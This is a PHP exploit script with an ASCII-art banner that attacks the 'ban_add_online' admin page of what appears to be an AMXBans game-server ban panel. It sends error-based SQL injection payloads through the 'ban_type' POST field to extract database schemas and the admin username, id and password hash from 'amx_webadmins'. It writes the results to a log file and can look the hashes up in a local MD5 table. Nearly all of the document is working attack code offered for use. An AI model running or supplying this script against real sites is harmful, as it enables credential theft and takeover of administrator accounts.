<?php
    system("clear");
    echo  '
                                               
                                        
    ``               `.           
    .ss                -Nh-`        
  `:mN`               `:NMNs        
  -NMh                 -oyMM/       
  sMMm` ```        `  ```yMMm       
  mMMMs/.``  ``    ````-+NMMM-      
 `dMMMMMyo:-`.```.`..-/mMMMMM:      
  oMMMMMMMdo+-```.`.-yNMMMMMN.      
  :MMMMMMMM+/`````..yMMMMMMMh`      
  `hNmMMMMMmy:   .yyMMMMMmNM:       
  `+y-omNddmNh`  hMNMMmm+:+y`       
   ..``:/``.--` `so++/--.``-`       
   `-s++..````.``:..`.-+-```        
    `/sysh+yy+y./-+/hsoh-`          
      ..ohymMhM+dyNsNy/o            
        .:/+doN:hsN+y-/:            
       `/  `:oy +:h..`s             
       .d-`  :. :`: `.s             
        hy`     -   `sh             
       `+N/`- -`  ` :mo`            
         sd+/.+/. o.hm.             
         :/yyhsdN:hsd+`             
         .`-shyhhoy+`               
             `...`                  

    ';

    start();
    function start()
    {
         load_list();
    }

    function load_list()
    {
        $hosts = array(
    	 "http://target.com/",
    	);

      foreach($hosts as $Link)
      {
        setup($Link);
      }
    }
    function setup($host)
    {
        $host = $host. "admin.php?site=ban_add_online";
       // $database = make_output(sendData(get_dbs(),$host));
        $username = make_output(sendData(get_username(),$host));
	    $id = make_output(sendData(get_id($username),$host));
        $password_first = make_output(sendData(get_password_first($username),$host));
        $password_last =  make_output(sendData(get_password_last($username),$host));
        $password = $password_first.$password_last;
        exploit($host,$id,$username,$password);
    }
    function exploit($host,$id,$username,$password)
    {
    	show($host,"HOST");
    	show($id,"ID");
        show($username,"Username");
        show($password,"Password");
       // restore_hash($password);
    }
    function make_output($data)
    {
        $data = preg_replace("/<[^<]+>/","", $data);
        $data = str_replace("XPATH","",$data);
        $data = str_replace("syntax error", "", $data);
        $data = str_replace(":","",$data);
        $data = str_replace("'","",$data);
        $data = preg_replace('/\s+/','',$data);
        return $data;
    }
    function show($data,$type)
    {
        echo "\r\n";
        echo "[".date("H:i:s"). "] ".$type."-> " .$data. "\n";
        log_access($type,$data); 
    }
    function log_access($type,$data)
    {
    	$log = fopen("access.txt","a");
    	fwrite($log,"[".$type."][".$data."]\r\n");
    	fclose($log);
    }
    function restore_hash($hash)
    {
        require "db.php";
        if(!empty($hash))
        {
            $query = "SELECT Password, MD5Hash FROM passwords WHERE MD5Hash = ? LIMIT 1";
            $stmt = mysqli_stmt_init($conn);
            $stmt->prepare($query);
            $stmt->bind_param("s",$hash);
            $stmt->execute();
            $result = $stmt->get_result();

            foreach($result as $pawned)
            {
                if($hash === $pawned["MD5Hash"])
                {
                    show("[".$pawned["Password"] ."][".$hash."]\r\n","Decrypted");
                }
                else
                {
                    echo "HASH NOT FOUND \r\n";
                }
            }
        }
    }
    function get_dbs()
    {
        $query = array(
                'ban'             => 1,
                'player_name'     => "player",
                'player_uid'     => 1,
                'player_ip'        => "127.0.0.1",
                'user_reason'    => "wh",
                'ban_length'    => 300,
                'ban_type'        => "'+(1 AND extractvalue(rand(),concat(0x3a,(SHOW SCHEMAS))))+'"
            );
            return $query;
    }
    function get_id($username)
    {
        $query = array(
                'ban'             => 1,
                'player_name'     => "player",
                'player_uid'     => 1,
                'player_ip'        => "127.0.0.1",
                'user_reason'    => "wh",
                'ban_length'    => 300,
                'ban_type'        => "'+(1 AND extractvalue(rand(),concat(0x3a,(SELECT id FROM `amx_webadmins` WHERE username = '".$username."' LIMIT 1 ))))+'"
            );
            return $query;
    }
    function get_username()
    {
        $query = array(
                'ban'             => 1,
                'player_name'     => "player",
                'player_uid'     => 1,
                'player_ip'        => "127.0.0.1",
                'user_reason'    => "wh",
                'ban_length'    => 300,
                'ban_type'        => "'+(1 AND extractvalue(rand(),concat(0x3a,(SELECT  username  FROM `amx_webadmins` WHERE ID > 0  LIMIT 2,1))))+'"
            );
            return $query;
    }
    function get_password_first($username)
    {
        $query = $query_string = array(
                'ban'             => 1,
                'player_name'     => "player",
                'player_uid'     => 1,
                'player_ip'        => "127.0.0.1",
                'user_reason'    => "wh",
                'ban_length'    => 300,
                'ban_type'        => "'+(1 AND extractvalue(rand(),concat(0x3a,(SELECT password as pwd FROM `amx_webadmins` WHERE username = '".$username."'  LIMIT 1))))+'"
            );
            return $query;
    }
    function get_password_last($username)
    {
        $query = $query_string = array(
                'ban'             => 1,
                'player_name'     => "player",
                'player_uid'     => 1,
                'player_ip'        => "127.0.0.1",
                'user_reason'    => "wh",
                'ban_length'    => 300,
                'ban_type'        => "'+(1 AND extractvalue(rand(),concat(0x3a,(SELECT right(password,1) as pwd FROM `amx_webadmins` WHERE username = '".$username."'  LIMIT 1))))+'"
            );
            return $query;
    }
    function validate_vendor($page)
    {
        $page = file_get_contents($page);
        
    }
    function sendData($data,$host)
    {
        $sender = curl_init($host);
        curl_setopt($sender,CURLOPT_POST,1);
        curl_setopt($sender, CURLOPT_POSTFIELDS, http_query($data));
        curl_setopt($sender, CURLOPT_RETURNTRANSFER,1);
        curl_setopt($sender, CURLOPT_FOLLOWLOCATION,0);
        return curl_exec($sender);
     }
    function http_query($data)
    {
        return http_build_query($data);
    }

?>
